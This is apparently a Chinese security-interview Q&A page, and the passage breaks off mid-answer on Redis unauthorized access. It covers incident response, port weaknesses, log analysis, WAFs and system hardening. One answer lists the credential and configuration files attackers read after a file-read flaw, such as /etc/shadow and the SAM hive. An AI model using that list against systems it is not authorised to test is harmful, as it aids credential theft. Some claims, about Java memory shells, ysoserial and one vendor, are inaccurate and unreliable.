title="一台主机在内网进行横向攻击，你应该怎么做？"></a>一台主机在内网进行横向攻击，你应该怎么做？</h2><p>如果一台主机在内网进行横向攻击，建议采取以下措施：</p><ol><li>隔离受感染的主机：立即将受感染的主机隔离，防止攻击者继续向其他主机传播恶意软件。</li><li>停止该主机的网络访问：为了避免感染蔓延到其他网络节点，需要立即停止该主机的网络访问。</li><li>收集攻击信息：记录并收集有关攻击者、攻击方式和攻击原因的信息。这些信息有助于后续的调查和取证工作。</li><li>清除恶意软件：使用杀毒软件或恶意软件清理工具对受感染的主机进行扫描和清理，确保所有恶意文件都被删除。</li><li>升级系统补丁：检查受感染主机是否存在已知漏洞，并及时安装相应的系统补丁，以防止攻击者再次利用已知漏洞进行攻击。</li><li>取证和分析：对受感染的主机进行取证和分析，以确定攻击者的入侵路径和方法，为后续的防御和修复工作提供参考。</li><li>加强安全防护：加强内网安全防护，定期进行内网安全扫描和审核，及时发现并修复安全漏洞。</li></ol><p>总之，在一台主机在内网进行横向攻击时，需要尽快采取以上措施，避免恶意软件感染蔓延到其他网络节点，最大程度保护整个内网的安全。</p><h2 id="常见端口及其漏洞有哪些？"><a href="#常见端口及其漏洞有哪些？" class="headerlink" title="常见端口及其漏洞有哪些？"></a>常见端口及其漏洞有哪些？</h2><p>以下是常见的端口及其漏洞：</p><ol><li>端口 21（FTP）：FTP服务常用于文件传输，常见漏洞包括弱口令、任意文件上传漏洞等。</li><li>端口 22（SSH）：SSH是远程登录系统的协议，常见漏洞包括弱口令、暴力破解、身份验证绕过等。</li><li>端口 23（Telnet）：Telnet是一个远程控制协议，常见漏洞包括明文传输敏感信息、会话劫持等。</li><li>端口 25（SMTP）：SMTP是发送电子邮件的标准协议，常见漏洞包括垃圾邮件滥用、反射攻击等。</li><li>端口 53（DNS）：DNS是域名解析服务，常见漏洞包括DNS缓存投毒、DDoS攻击等。</li><li>端口 80/443（HTTP/HTTPS）：HTTP/HTTPS是Web服务器常用的协议，常见漏洞包括SQL注入、XSS跨站脚本攻击、文件上传漏洞等。</li><li>端口 135（RPC）：RPC是远程过程调用协议，常见漏洞包括缓冲区溢出、拒绝服务攻击等。</li><li>端口 139/445（SMB）：SMB是Windows系统的文件共享协议，常见漏洞包括远程代码执行、密码破解等。</li><li>端口 3389（RDP）：RDP是Windows远程桌面协议，常见漏洞包括弱口令、暴力破解、远程代码执行等。</li></ol><p>以上仅是一些常见的端口及其漏洞，实际上还有很多其他的端口和漏洞。为了减少被攻击的风险，建议定期进行安全扫描，及时修复已知漏洞，并加强网络安全防护。</p><h2 id="你能大概说一下，比如数据包或者日志，你的分析思路是什么，以及你会用到哪些工具或者那些网站进行查询？"><a href="#你能大概说一下，比如数据包或者日志，你的分析思路是什么，以及你会用到哪些工具或者那些网站进行查询？" class="headerlink" title="你能大概说一下，比如数据包或者日志，你的分析思路是什么，以及你会用到哪些工具或者那些网站进行查询？"></a>你能大概说一下，比如数据包或者日志，你的分析思路是什么，以及你会用到哪些工具或者那些网站进行查询？</h2><p>当我分析数据包或者日志时，通常会采用如下的思路：</p><ol><li>收集数据包或日志文件：首先需要收集相关的数据包或日志文件，以便后续分析。</li><li>过滤和提取关键信息：对于大量的数据包或日志，需要通过过滤和提取关键信息的方式来缩小分析范围。例如，可以使用Wireshark的过滤器或grep命令来筛选出特定协议、IP地址等关键信息。</li><li>分析数据包或日志：根据需求进行数据包或日志的分析，并尝试从中发现异常或可疑行为。例如，可以查找异常的流量模式、不寻常的端口、频率异常的请求等。</li><li>确认问题并记录结论：在分析过程中，需要确认是否存在安全问题，并记录所得到的结论。</li><li>对问题进行修复和防范：最后，需要针对分析结果采取相应的措施，例如修补漏洞、加强访问控制、优化安全策略等，以降低风险和增强安全性。</li></ol><p>在这个过程中，我可能会使用以下一些工具和网站：</p><ul><li>Wireshark：网络数据包分析工具，用于捕获和分析网络数据包。</li><li>ELK Stack：用于日志管理和分析的综合解决方案，包括Elasticsearch、Logstash和Kibana。</li><li>grep命令：用于在文本文件中搜索特定模式的字符串。</li><li>WHOIS查询工具：用于查询域名的注册信息。</li><li>端口扫描工具：例如nmap，用于识别目标主机上开放的端口和服务。</li><li>CVE漏洞数据库：用于查询已知漏洞的详细信息。</li><li>OWASP Top 10：一个常见的Web应用程序安全风险排名列表，用于参考Web应用程序是否存在常见的安全问题。</li></ul><p>需要注意的是，分析过程中所用到的工具和网站因情况而异，具体根据实际需求进行选择。</p><h2 id="给你一个比较大的日志，应该如何分析"><a href="#给你一个比较大的日志，应该如何分析" class="headerlink" title="给你一个比较大的日志，应该如何分析"></a>给你一个比较大的日志，应该如何分析</h2><p>当面对一个比较大的日志文件时，通常需要采用以下几个步骤进行分析：</p><ol><li>对日志文件进行预处理：如果日志文件比较大，首先可以考虑对其进行切割、筛选等操作。例如，可以使用Linux系统中的split命令将大型日志文件拆成多个小文件，以便于后续的处理。</li><li>确定日志格式：在分析日志之前，需要了解日志的格式，例如时间戳、事件类型、IP地址等信息。这有助于我们快速定位和分析日志中的内容。</li><li>使用工具进行分析：目前市面上有很多针对日志分析的软件工具，例如ELK Stack（Elasticsearch、Logstash、Kibana）、Splunk等。这些工具能够帮助我们更加高效地分析、搜索和可视化日志数据。</li><li>定义分析目标：在开始分析日志之前，需要明确所需得到的结果以及要回答的问题。例如，我们可能需要查找某个特定的事件或行为、识别与安全相关的异常或潜在威胁等。</li><li>进行分析并记录结论：根据分析目标，采用相应的方法和工具对日志文件进行分析，并记录分析结论。同时要把发现的异常或有用的信息进行整理和汇总。</li><li>采取相应措施：根据分析结果，确定需要采取的措施。例如，修复漏洞、更新安全策略、加强访问控制等。</li></ol><p>需要注意的是，在处理大型日志文件时，可能会消耗较多的时间和计算资源。因此，可以通过合理地利用计算机硬件（例如使用多核CPU和高速磁盘）来提高处理效率。同时也可以将任务分解成多个小部分进行并行处理，以进一步提升分析效率。</p><h2 id="如何查看系统内存-shell"><a href="#如何查看系统内存-shell" class="headerlink" title="如何查看系统内存 shell"></a>如何查看系统内存 shell</h2><p>我们可以通过使用一些命令来查看系统内存的使用情况。以下是一些常用的命令：</p><ol><li>free：用于显示当前系统的内存使用情况，包括已用内存、空闲内存、缓冲区内存和交换分区内存等。</li></ol><pre class="line-numbers language-none"><code class="language-none">$ free -h              total        used        free      shared  buff/cache   availableMem:           7.8G        3.4G        289M         88M        4.1G        4.0GSwap:          2.0G        895M        1.1G<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li>top：用于实时监视进程的运行状态，包括CPU和内存的使用情况。在 top 命令中，我们可以按 M 键排序以查看占用内存较多的进程。</li><li>ps：用于列出正在运行的进程，可以结合其他的选项来查看进程的详细信息，例如：</li></ol><pre class="line-numbers language-none"><code class="language-none">$ ps aux --sort=-%mem | headUSER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMANDroot         1  0.0  0.1 225804 11356 ?        Ss   05:30   0:01 /sbin/init splash...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>以上命令都是在命令行环境下执行的。如果要图形化地查看系统内存使用情况，可以使用 GNOME 系统监视器（gnome-system-monitor）或 KDE 系统监视器（ksysguard）等工具，在图形化界面中方便地查看系统内存的使用情况和进程信息。</p><p>需要注意的是，当我们在 shell 中查看内存使用情况时，不要随意终止或杀死系统进程，否则可能会导致不可预估的后果。</p><h2 id="不安全的第三方组件的漏洞如何做前置规避？"><a href="#不安全的第三方组件的漏洞如何做前置规避？" class="headerlink" title="不安全的第三方组件的漏洞如何做前置规避？"></a>不安全的第三方组件的漏洞如何做前置规避？</h2><p>以下是一些规避不安全的第三方组件漏洞的前置方法：</p><ol><li>筛选可靠的第三方组件：在选择和采用第三方组件时，应该尽量选择那些经过广泛使用和审查、开源社区活跃、有明确维护计划等因素使人们信任的组件。此外还可以参考其他用户反馈、评测结果等对第三方组件进行评估。</li><li>定期更新组件版本：及时更新第三方组件以修复已知漏洞是很重要的。因此，需要定期检查并更新使用的第三方组件。</li><li>加强访问控制：为了防止黑客攻击通过不安全的第三方组件进入系统，需要加强访问控制，例如限制只有授权用户才能访问系统。</li><li>实施安全策略：实施相关的安全策略，如深度防御、安全审计等，以提高系统的安全性。</li><li>停用不必要的功能：如果某个第三方组件包含多个功能，但仅有部分功能被系统所用到，建议将未使用的功能关闭或移除，从而减少系统被攻击的风险。</li><li>使用漏洞扫描工具进行检测：使用漏洞扫描工具对系统中的第三方组件进行定期检测，及时发现已知漏洞并修复。</li></ol><p>需要注意的是，在前置规避不安全的第三方组件漏洞时，不能完全依赖于单一的措施。相反，应该采用多种手段来提高系统的安全性，从而避免被攻击者利用不安全的第三方组件漏洞进行攻击。</p><h2 id="Java-内存马排查有了解吗"><a href="#Java-内存马排查有了解吗" class="headerlink" title="Java 内存马排查有了解吗"></a>Java 内存马排查有了解吗</h2><p>Java内存马，也称为Java远程代码执行漏洞，是一种利用Java反序列化漏洞的攻击方式。攻击者可以通过构造恶意的序列化对象，将其发送给目标服务器并触发反序列化操作，从而在目标服务器上执行任意代码。以下是几种排查Java内存马的方法：</p><ol><li>追踪日志文件：如果系统已经被攻击，应该首先检查系统的日志文件，查找异常的请求或响应内容，并结合其他的信息确定是否存在Java内存马。</li><li>检查网络流量：可以使用Wireshark等网络抓包工具来监视服务器的网络流量，并分析报文中的数据内容，查找是否存在异常的Java序列化数据。</li><li>检查反序列化漏洞：Java内存马利用了Java反序列化漏洞，因此我们可以使用一些反序列化漏洞扫描工具（如 ysoserial）来检测系统是否受到这类漏洞的影响，并及时修补漏洞。</li><li>检查系统进程：Java内存马通常会在目标服务器上启动一个新的进程来执行恶意代码，因此可以通过检查系统进程列表，查找是否存在不明确的、异常的进程。</li><li>安装安全软件：为了更好地保障系统的安全性，可以安装一些专业的安全软件，如杀毒软件、入侵检测系统（IDS）等，并定期进行扫描和审计。</li></ol><p>需要注意的是，在排查Java内存马时，应该综合使用多种方法来确定是否存在此类攻击。同时也要及时修补系统漏洞，加强访问控制，并采取其他措施提高系统的安全性。</p><h2 id="如何修改-WEB-端口？如果不能修改端口还有什么利用方法？"><a href="#如何修改-WEB-端口？如果不能修改端口还有什么利用方法？" class="headerlink" title="如何修改 WEB 端口？如果不能修改端口还有什么利用方法？"></a>如何修改 WEB 端口？如果不能修改端口还有什么利用方法？</h2><p>要修改 WEB 端口，需要在 Web 服务器的配置文件中修改端口号。以下是一些常见的 Web 服务器的端口修改方式：</p><ol><li>Apache：找到 Apache 的 httpd.conf 配置文件，编辑 Listen 指令即可。</li></ol><pre class="line-numbers language-none"><code class="language-none">Listen 8080<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol><li>Nginx：找到 Nginx 的 nginx.conf 配置文件，编辑 http 模块下的 listen 指令即可。</li></ol><pre class="line-numbers language-none"><code class="language-none">http {    ...    server {        listen 8080;    }    ...}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li>Tomcat：找到 Tomcat 的 server.xml 配置文件，编辑 Connector 指令中的 port 属性即可。</li></ol><pre class="line-numbers language-none"><code class="language-none">&lt;Connector port="8080" protocol="HTTP/1.1"           connectionTimeout="20000"           redirectPort="8443" /&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>如果不能修改端口，攻击者可能会尝试其他利用方法，如：</p><ol><li>尝试使用默认或者弱口令登录：许多 web 应用程序都有默认的用户名和密码，或者用户使用简单的密码。攻击者可以通过爆破等方式，尝试使用这些凭据登录系统。</li><li>利用已知漏洞进行攻击：攻击者可以通过利用已知的漏洞来攻击目标系统，例如，注入攻击、文件上传漏洞、跨站点脚本（XSS）漏洞等。</li><li>利用社工攻击：攻击者可以使用钓鱼邮件、欺诈电话等方式进行社交工程攻击，从而获得目标系统的访问凭据或者其他重要信息。</li></ol><p>为了防止这些攻击，我们应该采取一系列措施来加强系统安全。例如：</p><ol><li>使用复杂的密码和多因素身份验证，提高登录安全性。</li><li>及时更新软件版本和安全补丁，修复已知的漏洞。</li><li>限制访问权限，仅允许授权用户访问系统，并对不明来源的流量进行阻拦或监测。</li><li>部署入侵检测系统（IDS）或入侵防御系统（IPS），对入侵行为进行实时监测和防范。</li><li>定期进行漏洞扫描、安全审计等工作，及时发现并修补系统中存在的漏洞。</li></ol><h2 id="获得文件读取漏洞，通常会读哪些文件，Linux-和-windows-都谈谈"><a href="#获得文件读取漏洞，通常会读哪些文件，Linux-和-windows-都谈谈" class="headerlink" title="获得文件读取漏洞，通常会读哪些文件，Linux 和 windows 都谈谈"></a>获得文件读取漏洞，通常会读哪些文件，Linux 和 windows 都谈谈</h2><p>获得文件读取漏洞后，攻击者通常会尝试读取一些敏感信息，例如系统配置文件、数据库凭据、应用程序源代码等。以下是在 Linux 和 Windows 操作系统上，攻击者可能会尝试读取的一些文件：</p><ol><li>Linux</li></ol><ul><li>/etc/passwd：包含本地用户的账户信息。</li><li>/etc/group：包含用户组的信息。</li><li>/etc/shadow：保存本地用户密码哈希值的文件。</li><li>/etc/sudoers：保存 sudo 命令权限的文件。</li><li>/proc/net/tcp：包含当前正在运行的 TCP 连接信息。</li><li>/var/log/auth.log：包含系统中用户认证和授权的日志信息。</li><li>应用程序配置文件：攻击者可能会尝试读取应用程序的配置文件，以获取数据库连接字符串等信息。</li></ul><ol><li>Windows</li></ol><ul><li>C:\Windows\system32\config\SAM：包含本地账户的哈希密码值。</li><li>C:\Windows\system32\config\SYSTEM：包含系统的配置信息。</li><li>C:\inetpub\wwwroot\web.config：包含 IIS 网站的配置信息。</li><li>C:\Program Files (x86)\MySQL\MySQL Server 5.7\my.ini：包含 MySQL 数据库的配置信息。</li><li>C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys：包含机器级别的 RSA 密钥。</li><li>Event log 文件：攻击者可能会尝试读取操作系统事件日志文件，以查看系统的历史记录信息。</li><li>应用程序配置文件：攻击者可能会尝试读取应用程序的配置文件，以获取数据库连接字符串等信息。</li></ul><p>为了防止文件读取漏洞的攻击，我们可以采取以下一些措施：</p><ol><li>限制访问权限：在操作系统、应用程序和网站中，应该合理设置安全访问策略，并对敏感信息和文件进行严格的权限控制。</li><li>加密重要文件：对重要文件进行加密处理，防止黑客获取有效信息。</li><li>安装入侵检测系统（IDS）：使用 IDS 系统来监测系统内部和外部的攻击行为。</li><li>监控日志：对系统中产生的日志进行定期审计和监控，及时发现异常情况并采取相应的措施。</li><li>及时修补漏洞：定期检查和更新系统、应用程序和第三方库的版本，以修复已知的漏洞。</li></ol><h2 id="如何分析被代理出来的数据流"><a href="#如何分析被代理出来的数据流" class="headerlink" title="如何分析被代理出来的数据流"></a>如何分析被代理出来的数据流</h2><p>被代理出来的数据流通常是由代理服务器拦截并转发的，可以借助代理工具（如 Burp Suite）等工具来对数据流进行分析。以下是一些可能的分析方法：</p><ol><li>拦截和重放请求：在代理工具中，我们可以通过拦截请求，并对其做出修改，然后再次发送请求到目标服务器上，从而观察应用程序如何响应这些请求。</li><li>查看请求和响应头信息：在代理工具中，我们可以查看 HTTP 请求和响应头信息，包括 cookies、User-Agent 等，以了解应用程序的行为。</li><li>分析 HTTP 响应体：代理工具能够捕获 HTTP 响应体，并显示在工具界面中，我们可以查看应用程序返回的 HTML、JavaScript、CSS、图片等内容，以便了解应用程序的结构和行为。</li><li>查找敏感信息：代理工具可以对所有的 HTTP 流量进行记录和分析，我们可以通过搜索敏感信息来查找密码、凭据等敏感信息是否泄露。</li><li>使用插件进行分析：代理工具通常具有各种插件，例如 XSS 扫描器、SQL 注入扫描器、漏洞扫描器等，可以使用这些插件来检测应用程序中的漏洞和安全风险。</li></ol><p>需要注意的是，在进行数据流分析时，必须遵守法律和道德规范，不得盗取或滥用他人信息。同时，对于代理工具捕获的敏感信息，一定要妥善保护，避免泄露给未授权的人员。</p><h2 id="查看-windows-进程的方法有哪些"><a href="#查看-windows-进程的方法有哪些" class="headerlink" title="查看 windows 进程的方法有哪些"></a>查看 windows 进程的方法有哪些</h2><p>以下是查看 Windows 进程的几种方法：</p><ol><li>任务管理器：可以通过打开任务管理器来查看当前正在运行的进程。在 Windows 10 中，可以使用快捷键 Ctrl + Shift + Esc 来打开任务管理器；在其他版本的 Windows 中，可以使用 Ctrl + Alt + Delete 快捷键，然后选择“任务管理器”来打开。</li><li>命令行工具：可以使用命令行工具（如 cmd 或 PowerShell）来查看进程。在命令行中输入“tasklist”命令，即可列出当前正在运行的所有进程及其相关信息。</li><li>系统资源监视器：系统资源监视器是一个 Windows 内置的性能监控工具，可以查看系统的 CPU 使用率、内存占用率、磁盘和网络活动等信息。同时，它还提供了一个进程列表，可以显示每个进程的 CPU 使用率、内存占用情况等详细信息。</li><li>第三方工具：除了 Windows 自带的工具外，还有许多第三方工具可以用来查看进程，如 Process Explorer、Process Hacker 等。这些工具通常提供更加详细的进程信息，并允许用户对进程进行调试和管理。</li></ol><p>无论使用哪种方法，对于一些可疑的进程，我们应该及时采取相应的措施，例如杀死进程、禁止其自启动等。同时，我们还应该注意保护系统安全，避免恶意进程的入侵和攻击。</p><h2 id="如何查看进程对应的程序位置"><a href="#如何查看进程对应的程序位置" class="headerlink" title="如何查看进程对应的程序位置"></a>如何查看进程对应的程序位置</h2><p>在 Windows 操作系统中，可以通过以下几种方法查看进程对应的程序位置：</p><ol><li>使用任务管理器：打开任务管理器，选择“详细信息”选项卡，右键单击需要查看程序位置的进程，选择“打开文件位置”。</li><li>使用资源监视器：在资源监视器中，选择“CPU”选项卡，找到需要查看程序位置的进程，在右侧面板中选择该进程并右键单击，选择“属性”菜单，即可查看程序位置。</li><li>使用命令行工具：打开命令提示符或者 PowerShell，输入以下命令：</li></ol><pre class="line-numbers language-none"><code class="language-none">wmic process where "processid=[进程 ID]" get ExecutablePath<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>其中，[进程 ID]是需要查看的进程的 PID（进程标识符）。</p><ol><li>使用第三方工具：许多第三方工具（如 Process Explorer）提供了更加详细的进程信息，并可以帮助用户快速定位程序位置。</li></ol><p>无论使用哪种方法，我们都可以在查找到程序位置后，根据需要采取相应的措施。例如，为了解决某些问题，我们可能需要删除、备份或更新程序文件；而在排查安全问题时，我们可能需要检查程序文件是否被篡改或者感染了病毒。</p><h2 id="WAF-产品有哪些分类，是如何拦截攻击的"><a href="#WAF-产品有哪些分类，是如何拦截攻击的" class="headerlink" title="WAF 产品有哪些分类，是如何拦截攻击的"></a>WAF 产品有哪些分类，是如何拦截攻击的</h2><p>WAF（Web 应用程序防火墙）产品通常可以分为以下几种分类：</p><ol><li>基于签名的 WAF：基于签名的 WAF 通过检测请求中是否包含已知漏洞的特征，来拦截攻击。这种类型的 WAF 可以快速识别和阻止已知的攻击方式。</li><li>基于行为的 WAF：基于行为的 WAF 使用机器学习、人工智能等技术来分析请求的行为模式，并判断其是否具有攻击性。这种类型的 WAF 能够较好地识别未知攻击。</li><li>综合型 WAF：综合型 WAF 结合了基于签名和基于行为两种技术，能够同时检测已知攻击和未知攻击，提供更加全面的保护。</li></ol><p>WAF 产品一般通过拦截攻击请求来保护 Web 应用程序。具体的拦截方式包括：</p><ol><li>黑名单过滤：根据已知的攻击方式，设置黑名单规则，对符合规则的请求进行拦截。</li><li>白名单过滤：对请求进行白名单过滤，只允许符合规则的请求通过。</li><li>存储过程注入防护：对 SQL 注入进行防护。WAF 可以检测并拦截具有攻击意图的 SQL 语句，并对其进行相应的修复和防护。</li><li>跨站脚本（XSS）防护：WAF 可以检测并过滤包含恶意 JavaScript 代码的请求，并防止 XSS 攻击。</li><li>防止文件上传漏洞：WAF 可以检测并拦截包含恶意文件的请求，从而避免文件上传漏洞导致的攻击。</li></ol><p>总之，WAF 产品可以有效地保护 Web 应用程序免受各种类型的攻击。但是需要注意的是，WAF 并不是万能的，仍然需要结合其他安全措施来保障 Web 应用程序的安全。</p><h2 id="你有用过态势感知的产品吗？"><a href="#你有用过态势感知的产品吗？" class="headerlink" title="你有用过态势感知的产品吗？"></a>你有用过态势感知的产品吗？</h2><ol><li>360态势感知：由中国著名安全厂商360推出的产品，主要提供网络威胁查询、漏洞扫描、流量分析等功能，同时集成了各种安全情报和指标，可以为用户提供全面的安全态势分析和预警服务。</li><li>腾讯云安全大脑：由腾讯云推出的产品，利用 AI、机器学习等技术对攻击进行实时监测和分析，提供包括漏洞扫描、风险评估、异常检测等一系列安全服务。</li><li>云锁事件响应中心：由阿里云推出的产品，提供网络空间威胁和安全事件的监测、预警、应急响应等服务。该产品采用 AI 算法进行态势感知，并可以自动化响应安全事故。</li><li>北京赛迪态势感知系统：由北京赛迪安全科技股份有限公司开发的产品，支持网络威胁情报搜集、风险事件自动识别、威胁行为关联分析等功能，可为企业提供全生命周期的网络安全保护。</li><li>启明星辰安全态势感知：由启明星辰推出的产品，提供整体安全态势感知、针对性攻击检测、应急响应等功能，可帮助用户实现从被动防御到主动防御的转变。</li></ol><p>这些产品都采用了先进的机器学习和人工智能技术，可以自动化地分析和识别网络威胁，并及时发出预警或者采取应急措施。同时，这些产品还具备可视化的操作界面，用户可以通过简单的操作就可以了解整个系统的安全情况，并做出相应的决策。</p><h2 id="什么是跨域，JSONP-与-CORS"><a href="#什么是跨域，JSONP-与-CORS" class="headerlink" title="什么是跨域，JSONP 与 CORS"></a>什么是跨域，JSONP 与 CORS</h2><p>在 Web 开发中，跨域（Cross-Origin）指的是当一个 web 应用程序在访问另一个与其来源（协议、域名或端口号）不同的 web 应用程序时所发生的浏览器安全限制。这种限制可以防止非法的数据窃取和恶意代码的注入，从而保障了用户的信息安全。</p><p>为了解决跨域问题，Web 安全领域出现了两种常见的技术：JSONP 和 CORS。</p><ol><li>JSONP：JSONP（JSON with Padding）是一种跨域请求数据的方式，原理是通过在 HTML 页面上使用 script 标签加载远程 JSON 数据，并通过回调函数处理获取到的数据。这种方式可以绕过浏览器的同源策略，但只支持 GET 请求。</li><li>CORS：CORS（Cross-Origin Resource Sharing）是在服务器端设置允许跨域请求的机制。它通过在 HTTP 头信息中添加一些字段来告诉浏览器该服务器允许哪些域名的请求。CORS 可以支持各种类型的 HTTP 请求，并且比 JSONP 更加灵活和安全。</li></ol><p>总之，无论是 JSONP 还是 CORS，都是为了解决跨域问题而设计的技术。开发人员可以根据自己的需求来选择适合自己的方式，并结合安全考虑进行使用。同时，为了保护用户的信息安全，在使用跨域技术时，需要特别注意对传输数据的加密和防篡改措施。</p><h2 id="如何发现钓鱼邮件"><a href="#如何发现钓鱼邮件" class="headerlink" title="如何发现钓鱼邮件"></a>如何发现钓鱼邮件</h2><p>钓鱼邮件是一种常见的网络针对性攻击手段，通常通过电子邮件发送虚假信息诱骗受害者提供个人敏感信息或进行非法行为。以下是几种发现钓鱼邮件的方法：</p><ol><li>查看发件人地址：钓鱼邮件的发件人地址通常会伪装成合法、可信的机构或公司，但是如果您仔细查看发件人地址，就可能发现其不是该机构或公司真正的域名。</li><li>检查链接地址：钓鱼邮件中通常会包含可疑的链接，如果您将鼠标悬停在链接上，就可以看到链接的真实地址。如果该地址与邮件内容不符，就可能是钓鱼邮件。</li><li>注意邮件内容：钓鱼邮件通常会给人留下一种紧急、必须立即采取行动的感觉，从而诱骗用户点击链接或执行某些操作。因此，如果您收到这样的邮件，请仔细阅读邮件内容，并多加思考和确认。</li><li>尽量避免下载附件：钓鱼邮件通常会携带恶意附件，如果您无法确认邮件的真实性，最好不要下载或打开这些附件，以免被感染。</li><li>安装反钓鱼软件：有一些反钓鱼软件可以帮助用户检测和拦截钓鱼邮件，例如 Google 的 Password Alert 等。</li></ol><p>总之，发现钓鱼邮件需要多加警惕和注意，在收到可疑邮件时，应该仔细查看邮件内容和相关信息，并尽可能采取措施避免被钓鱼攻击。</p><h2 id="如何查看区分是扫描流量和手动流量"><a href="#如何查看区分是扫描流量和手动流量" class="headerlink" title="如何查看区分是扫描流量和手动流量"></a>如何查看区分是扫描流量和手动流量</h2><p>扫描流量和手动流量的区别在于其产生的方式和行为特征，因此可以通过以下几种方法来查看区分它们：</p><ol><li>查看流量来源：扫描流量通常是由自动化工具或蠕虫病毒等程序生成的，因此其源 IP 或者发起请求的主机通常不固定，而手动流量则来自人工操作的设备，其请求的 IP 地址和用户代理信息都会有所不同。</li><li>检测流量频率和规律：扫描流量通常会呈现出周期性、规律性的访问行为，例如连续大量的 TCP SYN 请求等。而手动流量则通常难以呈现出明显的规律和周期性。</li><li>观察流量的请求路径和参数：扫描流量通常是为了探测系统漏洞和弱点而产生的，它们通常会对一些已知的 URL 和参数进行大量的尝试，并使用一些特殊的 HTTP 头部信息。而手动流量则更加多样化，可能会包含更丰富的请求路径和参数。</li><li>分析流量的响应状态码和长度：扫描流量通常会通过检测返回的状态码和页面长度等信息来判断目标是否存在漏洞或弱点。手动流量则通常会具有更加正常的响应状态码和页面长度。</li></ol><p>总之，通过综合分析流量来源、访问规律、请求路径和参数以及响应状态码等特征，我们可以比较准确地区分扫描流量和手动流量，并采取相应的防御措施。</p><h2 id="遇到-exe-文件如何处理？"><a href="#遇到-exe-文件如何处理？" class="headerlink" title="遇到.exe 文件如何处理？"></a>遇到.exe 文件如何处理？</h2><p>.exe 文件是 Windows 上的可执行文件，通常包含应用程序或者安装程序等内容。如果您在电子邮件或者网络上收到了 .exe 文件，需要格外小心，因为它们可能包含病毒、恶意软件或者其他危险物品。以下是几种处理方法：</p><ol><li>不要直接运行：不要轻易双击或者打开未知来源的 .exe 文件，因为它们可能会启动恶意软件，并对您的系统造成损害。如果您必须要运行这些 .exe 文件，请先进行杀毒软件扫描和检测操作。</li><li>使用虚拟机：如果您需要测试某个 .exe 文件的行为和效果，可以考虑使用虚拟机。虚拟机可以将一个完整的操作系统运行在一个软件容器中，使得用户可以在其中安全地运行可疑的 .exe 文件，并且不会影响主机系统的安全性。</li><li>上传到在线扫描服务平台：一些在线杀毒软件平台，例如 VirusTotal 等，提供了在线扫描可疑文件的服务。如果您不确定一个 .exe 文件是否安全，可以上传到这些平台进行扫描，以获取更多的信息和建议。</li><li>将文件发送给安全专家：如果您无法确定 .exe 文件的安全性，可以将其发送给安全专家进行分析。安全专家可以根据其行为特征和结构等信息，对该文件进行深度分析，以确定是否存在潜在的安全威胁。</li></ol><p>总之，在处理未知来源的 .exe 文件时，需要注意谨慎并采取必要的安全措施，以确保您的系统不会被攻击或感染。如果您遇到可疑的 .exe 文件，请务必进行杀毒软件扫描，并尽可能获取更多的信息和建议。</p><h2 id="应急响应的排查思路？"><a href="#应急响应的排查思路？" class="headerlink" title="应急响应的排查思路？"></a>应急响应的排查思路？</h2><p>应急响应的排查思路主要包括以下几个方面：</p><ol><li>确认事件：首先需要了解事件的具体情况，包括发生的时间、影响范围、受影响的系统和服务等信息。同时还需要判断是否存在钓鱼邮件、病毒感染等情况，以确定是否存在网络安全事件。</li><li>收集证据：在确认安全事件后，需要及时收集相关证据，包括日志记录、网络流量、进程信息、文件系统状态等信息，并进行存档备份。这些证据可以为后续的分析提供依据。</li><li>分析数据：对收集到的证据进行分析，尤其是日志和网络流量等数据，可以帮助快速定位问题和确认是否存在攻击行为。在分析过程中，可以利用一些常见的工具，例如 Wireshark、Nmap、Sysinternals 等。</li><li>阻止攻击：在确认存在攻击行为后，需要立即采取措施，阻止攻击并保护现有系统。这些措施包括封锁网络、隔离受感染主机、关闭漏洞等。</li><li>制定应急计划：根据分析结果，制定相应的应急计划，确保系统能够迅速恢复正常的运行状态。应急计划应该包括恢复数据、修复漏洞、加强安全防御等方面。</li></ol><p>总之，应急响应排查思路需要遵循快速响应、收集证据、分析数据、阻止攻击和制定应急计划等原则，并且需要依靠专业的技能和工具来实现。在实际操作中，需要小心谨慎，同时保持高度警惕和敏锐性。</p><h2 id="普通的加固手段？"><a href="#普通的加固手段？" class="headerlink" title="普通的加固手段？"></a>普通的加固手段？</h2><p>普通的加固手段包括以下几种：</p><ol><li>更新补丁：定期更新操作系统、应用程序的补丁，修复已知的漏洞和安全问题。</li><li>强化口令策略：采用复杂、难以猜测的密码，并进行定期更换。同时可以启用账户锁定、多次失败尝试限制等功能，提高口令安全性。</li><li>加强身份验证：采用多因素身份验证技术，例如使用硬件令牌、生物特征等方式，确保只有授权用户才能访问系统。</li><li>安装防病毒软件：安装并及时更新防病毒软件，定期进行全盘扫描和实时监控，以便及时发现和处置潜在的恶意软件。</li><li>关闭不必要服务：关闭系统中不必要的服务和端口，降低攻击面，避免被利用。</li><li>限制访问权限：根据业务需要，设置合理的访问权限，对于未授权的用户或者设备进行限制，提高系统的安全性。</li><li>数据备份与恢复：定期备份重要数据，并将其存储在安全可靠的位置。在出现故障或事件时，能够快速恢复数据，避免数据丢失和系统停机。</li></ol><p>总之，以上这些普通的加固手段可以帮助提高系统的安全性和稳定性，并且也是网络安全基础建设的关键步骤。在实际操作中，需要根据具体情况和需求，结合其他安全措施来进行综合加固。同时需要注意及时更新和检查，以确保系统始终处于安全状态。</p><h2 id="redis未授权的条件，修复方式？"><a href="#redis未授权的条件，修复方式？" class="headerlink" title="redis未授权的条件，修复方式？"></a>redis未授权的条件，修复方式？</h2><p>Redis 未授权访问是指某些 Redis 实例的访问控制没有得到正确配置，导致攻击者可以通过不需要认证的方式直接连接该实例并进行操作。这可能会导致敏感数据泄露、系统被攻击等安全问题。</p><p>修复 Redis 未授权访问的方式包括以下几个步骤：</p><ol><li>确认是否存在未授权访问：通过检查日志和网络流量等信息，确认是否存在未授权访问的情况。</li><li>修改 Redis 配置文件：在 redis.config 配置文件中，找到 bind 参数并将其设置为 Redis 监听的 IP 地址。此外，还需要设置 requirepass 参数，并设置一个强密码来保护 Redis 数据库。</li><li>重新启动 Redis 服务：在修改完 